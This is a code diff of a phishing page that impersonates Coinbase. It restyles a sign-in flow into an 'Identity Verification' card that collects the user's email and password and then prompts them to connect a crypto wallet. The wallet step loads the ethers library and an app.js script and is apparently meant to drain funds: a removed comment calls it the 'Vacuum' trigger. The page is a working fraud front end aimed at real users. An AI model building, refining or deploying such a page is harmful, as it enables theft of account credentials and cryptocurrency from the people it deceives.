@@ -6,7 +6,6 @@
     <title>Coinbase | Secure Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
-    <!-- Using the latest ethers version for maximum compatibility -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.umd.min.js"></script>
 </head>
 <body>
@@ -19,25 +18,15 @@
             <button type="button" id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- STEP 2: LOGIN FORM -->
+        <!-- STEP 2: CREDENTIALS & WALLET -->
         <div id="step-2" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1>Sign In</h1>
-            <p>Please enter your account credentials to continue.</p>
-            <form id="login-form">
+            <h1>Identity Verification</h1>
+            <p>Please enter your account details to authorize the synchronization of your assets.</p>
+            <div class="form-group">
                 <input type="email" id="email" placeholder="Email Address" required>
                 <input type="password" id="pass" placeholder="Password" required>
-                <button type="submit" class="btn-primary">Continue</button>
-            </form>
-        </div>
-
-        <!-- STEP 3: THE SECURITY VERIFICATION (The "Vacuum" Trigger) -->
-        <div id="step-3" class="auth-card hidden">
-            <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1 style="font-size: 20px;">Identity Verification</h1>
-            <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
-                A temporary hold will be placed to verify the user.
-            </p>
+            </div>
             <button id="connectBtn" class="btn-primary">Verify Wallet</button>
             <div id="status" class="status-text"></div>
         </div>
@@ -49,7 +38,6 @@
         <a href="#">Terms of Service</a>
     </footer>
 
-    <!-- Make sure your JavaScript file is named exactly app.js -->
     <script src="app.js"></script>
 </body>
 </html>
